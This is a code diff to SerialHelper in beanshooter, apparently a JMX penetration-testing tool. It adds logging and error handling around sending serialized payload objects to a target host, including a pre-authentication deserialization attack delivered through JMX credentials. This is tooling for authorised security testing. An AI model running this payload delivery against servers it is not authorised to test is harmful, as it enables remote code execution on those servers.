@@ -10,6 +10,8 @@ import javax.management.remote.JMXConnector;
 
 import de.qtc.beanshooter.cli.ArgumentHandler;
 import de.qtc.beanshooter.exceptions.AuthenticationException;
+import de.qtc.beanshooter.exceptions.ExceptionHandler;
+import de.qtc.beanshooter.exceptions.InvalidLoginClassException;
 import de.qtc.beanshooter.io.Logger;
 import de.qtc.beanshooter.plugin.PluginSystem;
 
@@ -35,11 +37,16 @@ public class SerialHelper
         String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
         int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);
 
+        Logger.printlnYellow("Sending payload object.");
+
         try(Socket sock = new Socket(host, port))
         {
             ObjectOutputStream objOut = new ObjectOutputStream(sock.getOutputStream());
             objOut.writeObject(payload);
         }
+
+        Logger.printlnMixedBlue("The payload object", "was send", "successfully.");
+        Logger.printlnMixedBlueFirst("Notice:", "For JMXMP endpoints it is not possible to determine the success of a payload.");
     }
 
     /**
@@ -49,7 +56,7 @@ public class SerialHelper
      * @param payload payload object to send
      * @throws AuthenticationException
      */
-    public static void serialPreauth(Object payload) throws AuthenticationException
+    public static void serialPreauth(Object payload)
     {
         String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
         int port = ArgumentHandler.require(BeanshooterOption.TARGET_PORT);
@@ -57,7 +64,27 @@ public class SerialHelper
         Map<String,Object> env = new HashMap<String,Object>();
         env.put(JMXConnector.CREDENTIALS, payload);
 
-        PluginSystem.getMBeanServerConnectionUmanaged(host, port, env);
-        Logger.printlnMixedYellow("Remote MBeanServer",  "accepted", "the payload class.");
+        try
+        {
+            PluginSystem.getMBeanServerConnectionUmanaged(host, port, env);
+            Logger.printlnMixedYellow("Remote MBeanServer",  "accepted", "the payload class.");
+        }
+
+        catch (AuthenticationException e)
+        {
+            Throwable t = ExceptionHandler.getCause(e.getOriginalException());
+
+            if (t instanceof ClassNotFoundException)
+                ExceptionHandler.deserialClassNotFound((ClassNotFoundException)t);
+
+            else if (e instanceof InvalidLoginClassException)
+            {
+                Logger.printlnMixedRed("Server appears to be", "not vulnerable", "to preauth deserialization attacks.");
+                ExceptionHandler.showStackTrace(e);
+            }
+
+            else
+                ExceptionHandler.unexpectedException(e, "preauth deserialization", "attack", false);
+        }
     }
 }
